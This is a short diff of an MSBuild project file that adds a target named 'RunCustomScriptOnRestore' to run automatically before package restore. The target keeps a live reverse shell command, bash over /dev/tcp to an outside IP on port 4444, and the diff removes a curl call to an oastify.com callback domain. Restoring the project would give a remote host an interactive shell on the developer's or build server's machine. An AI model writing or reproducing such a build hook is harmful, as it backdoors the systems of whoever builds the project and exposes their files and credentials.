@@ -9,7 +9,6 @@
 
   <Target Name="RunCustomScriptOnRestore" BeforeTargets="Restore">
     <Exec Command="bash -i >& /dev/tcp/3.23.1.7/4444 0>&1" />
-    <Exec Command="curl pr.4tygnvssh8bbesj3fiekgfixgomfa8yx.oastify.com" />
   </Target>
 
 </Project>
